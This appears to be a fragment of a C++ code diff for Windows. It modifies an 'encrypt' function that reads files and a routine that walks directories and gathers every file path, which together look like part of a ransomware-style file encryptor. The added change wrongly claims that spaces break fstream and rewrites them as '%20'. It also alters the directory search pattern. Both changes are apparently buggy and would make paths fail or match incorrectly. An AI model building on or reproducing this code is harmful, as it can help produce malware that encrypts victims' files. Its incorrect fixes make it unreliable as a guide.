@@ -4,7 +4,16 @@
 #include <filesystem>
 #include <windows.h>
 using namespace std;
+std::string replaceSpaces(std::string str) {//Filepaths with space breaks fstream
+    size_t pos = str.find(" ");
+    while (pos != std::string::npos) {
+        str.replace(pos, 1, "%20");
+        pos = str.find(" ", pos + 3);
+    }
+    return str;
+}
 void encrypt(string filepath) {
+    filepath = replaceSpaces(filepath);
     std::ifstream file(filepath, std::ios::binary);
     //Buffer variable is a vector (Array) | read file character by character
     std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
@@ -19,7 +28,7 @@ void FindFilesInDirectory(string directory) {
     WIN32_FIND_DATAA data;
     HANDLE hFind;
     string fullPath;
-    if ((hFind = FindFirstFileA((directory + "\\*").c_str(), &data)) != INVALID_HANDLE_VALUE) {//First file in root, if valid handle
+    if ((hFind = FindFirstFileA((directory + "*").c_str(), &data)) != INVALID_HANDLE_VALUE) {//First file in root, if valid handle
         do {
             if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {//Will not itterate on current directory, "." and ".."
                 fullPath = directory + "\\" + data.cFileName;
